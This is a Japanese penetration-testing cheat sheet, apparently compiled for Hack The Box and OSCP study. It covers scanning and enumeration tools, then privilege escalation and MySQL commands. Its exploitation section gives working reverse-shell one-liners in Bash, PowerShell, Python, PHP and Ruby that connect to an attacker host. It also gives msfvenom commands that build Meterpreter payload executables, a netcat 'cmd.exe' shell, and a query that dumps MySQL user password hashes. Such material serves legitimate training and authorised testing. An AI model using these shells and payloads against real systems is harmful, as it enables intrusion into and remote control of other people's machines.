# ペネトレーションテスト用チートシート
Hack The Boxの攻略やOSCPの取得を目指して、まとめているチートシートです。  
随時更新して成長していきます。
<img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">
Twitter:@yukitsukai1731

## 目次

- [Network Scan](#Network_scan)
  - [Nmap](#nmap)
- [WebScan](#Web_scan)
  - [Gobster](#Gobuster)
  - [Nikto](#Nikto)
  - [WPScan](#WPScan)
  - [BurpSuite](#BurpSute)
- [SMB Scan](#SMB_scan)
  - [smbclient](#smbclient)
  - [impacket-smbserver](#impacket-smbserver)
  - [enum4linux](#enum4linux)
- [侵入](#exploitation)
  - [reverse_shell](#reverse_shell)
    - [Bash](#Bash)
    - [Powershell](#Powershell)
    - [Python](#Python)
    - [PHP](#PHP)
    - [Ruby](#Ruby)
    - [msfvenom](#msfvenom_reverse_shell)
      - [Windows(meterpreter)](#Windows(meterpreter))
      - [Windows(netcatなど)](#Windows(netcatなど))
      - [Linux](#Linux)
  - [Web Application](#web-application)
      - [Web Remote Code Execution](#web-remote-code-execution)
      - [LFI](#lfi)
      - [XSS](#xss)
      - [SQLi](#sqli)
        - [sqlmap](#sqlmap)
- [特権エスカレーション](#特権エスカレーション)
  - [metasploit local_exploit_suggester](#metasploit(local_exploit_suggester))
  - [Windows](#windows)
    - [windows-exploit-suggester](#windows-exploit-suggester.py)
    - [#evilwinrm](#evilwinrm)
  - [Linux](#linux)
    - [linux-exploit-suggester.pl](#linux-exploit-suggester.pl)
  - [HTTP/HTTPS Servers](#httpserver)
  - [Wordlist](#wordlist)
  - [Default Passwords](#default-passwords)
- [その他](#その他)
  - [ツールまとめ](#ツールまとめ)
    - [NetCat](#netcat)
  - [未分類](#未分類)
    - [ssh](#ssh)
    - [mysql](#mysql) 


# Network_scan

## Nmap
ポートスキャンツール。  
対象の情報を得るためのまず第一歩。
2つ目のスキャンは時間がかかるため、並行してスキャンする。

```
nmap -sC -sV -Pn -oN <output filename> <target ip>
nmap -sC -sV -Pn -p- -oN <output filename> <target ip>
```

- -sC...デフォルトスクリプトでスキャン
- -sV...バージョン検出
- -Pn...ping送信をせずにスキャン
- -oN...ファイルへ出力
- -p-...全ポートをスキャン(時間がかかる)

脆弱性の基本的な調査を行うために「--script vuln」オプションを追加する

```
nmap -A -Pn -p- --script vuln <target ip>
```

## 個別に有名なSMBの脆弱性の調査をしたい時
これを用いてMS08-067やMS17-010などを検出

```
nmap -script smb-vuln* -p 139,445 <target ip>
```

### NSEスクリプトが配置されているディレクトリ
```
/usr/share/nmap/scripts
```

```検索
ls | grep smb
```

# Web_scan

## Gobuster
ディレクトリスキャナー。
隠されたディレクトリがないか調べるために使用。

```
gobuster dir -u <target url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,py -o <output filename>
```

- dir...ディレクトリ総当たり
- -u...URL指定
- -w...wordlistの指定
- -o...ファイル出力
- -x...拡張子指定


## Nikto
Webサーバスキャナー。
Webサイトを調査し悪用可能な脆弱性の検出を行う。

```
nikto -h <target url> -Format txt -o <output filename>
```
- -h...url指定
- -Format...出力するファイルの拡張子を指定
- -o...ファイルへ出力する
- -ssl...SSLを使用するサイトで使用


## WPScan
WordPressの脆弱性診断ツール。

```
wpscan -url <target url> -e u -t -vp --log <output filename>
```

- -url...対象のURL指定
- -e u...usernameの列挙
- -t...テーマを列挙
- -vp...脆弱性のあるプラグインを列挙
- --log...ファイル出力

## BurpSuite
ローカルプロキシツール。
通信の改ざんをするために使用。
他にもXSSやSQLインジェクションなどの脆弱性を発見するために使う。
LFIなどを利用する時に使用。

![スクリーンショット 2020-06-08 14.01.26.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/9fa84891-db19-8f3c-eb87-c1e7777a3fce.png)


# SMB_Scan

## smbclient

匿名ログインが有効になっているかの確認。

```
smbclient -L <target ip>
```

# impacket-smbserver
対象サーバにツールを送り込む際に使用。
主にnetcatもpowershellも使えないようなときに使う。

```
python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp <共有するディレクトリ>
```

```
C:\WINDOWS\system32>\\<smbserverを立ち上げたIPアドレス>\temp\whoami.exe
```

## enum4linux
WindowsおよびSambaホストからのデータを列挙するためのツール

```
enum4linux -U -o <target ip>
```

- -U...ユーザリスト取得
- -o...OS情報取得

# Exploitation

## reverse_shell

### Bash
```
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

### Powershell
```
function reverse_powershell {
    $client = New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
}
```

```
powershell -ExecutionPolicy bypass -command "Import-Module reverse.ps1; reverse_powershell"
```

### Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```


### PHP
```
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## msfvenom reverse_shell
#### Windows(meterpreter)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
```
#### Windows(netcatなど)
```
msfvenom -p windows/shell_reverse_tcp lhost=10.0.0.1 lport=4444 –f exe > reverse.exe
```

#### Linux
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o <outout_name>.elf
```

# 特権エスカレーション
### metasploit(local_exploit_suggester)
exploitをせずに脆弱性をチェックするために使用するモジュール。
meterpreterでシェルを取得している場合、これを使うことで特権昇格に使えるexploitを簡単に探すことができる。

```
use post/multi/recon/local_exploit_suggester
```
## windows
### windows-exploit-suggester
windowsでexploitを列挙するためのスクリプト
systeminfoコマンドの出力が必要
```
./windows-exploit-suggester.py --update
pip install xlrd
```

```
systeminfo > systeminfo.txt
./windows-exploit-suggester.py –database 2020-06-08-mssb.xls –systeminfo systeminfo.txt
```

## evlilwinrm
WinRM(Windowsリモート管理)を利用したペンテスト特化ツール
5985ポートが空いている時に使用

### インストール

```
gem install evil-winrm
```

### 使い方
```
evil-winrm -u <username> -p <password> -i <remote host ip>
```

## linux
### linux-exploit-suggester
linuxで特権昇格の脆弱性を列挙するためのスクリプト

```
./linux-exploit-suggester.pl
```

# httpserver
攻撃者マシンでのサーバ立ち上げ。

```
python -m SimpleHTTPServer <ポート番号>
python3 -m http.server <ポート番号>
```


# wordlists
direbusterやwifiパスワードなどのリスト集。
```
/usr/share/wordlists/
```

# default-passwords
機器に設定されているデフォルトパスワードのリスト集。
```
/usr/share/metasploit-framework/data/wordlists/
```

# その他
## ツールまとめ
## netcat
NetcatはTCP/UDPの各プロトコルと通信することができる万能ツールである。

通信待ち受け
```
nc -nlvp <port number>
```
- -n...DNSによる名前解決を行わない
- -l...リッスンモード
- -v...標準メッセージの出力
- -p...ポートの指定

通信の接続
```
nc -nv <target ip> <port number>
```

### reverse_shell
netcatで通信を待ち受けつつ、対象から以下のコマンドを入力
```
nc -nv <attack machine ip> <port number> -e cmd.exe
```

netcatで待ち受けつつ、python・ruby・bash・phpなどを用いてreverse_shellに使うことができる。
ほかの言語での使用方法は後述する。




# 未分類
## ssh
```
ssh <username>@<target ip>
```

### SSHトンネリング
ファイアウォールを超えて外部から目的サーバにアクセス可能
```
ssh -L 8080:127.0.0.1:80 <username>@<target ip>
```

## mysql
ログイン
```
mysql -u <username> -p
mysql -u <username> -p -h <host name> -P <port number>
```

データベース一覧の表示
```
mysql > show databases;
```

データベースの追加
```
mysql > create database sample_db;
```

テーブル一覧の表示
```
mysql > show tables;
```




ユーザ情報取得
```
SELECT Host, User, Password FROM mysql.user;
```

ユーザの追加
```
create user <追加するusername>@<host name> IDENTIFIED BY <password>;
```

権限付与
```
grant all privileges on test_db.* to <username>@<host name> IDENTIFIED BY <password>;
```

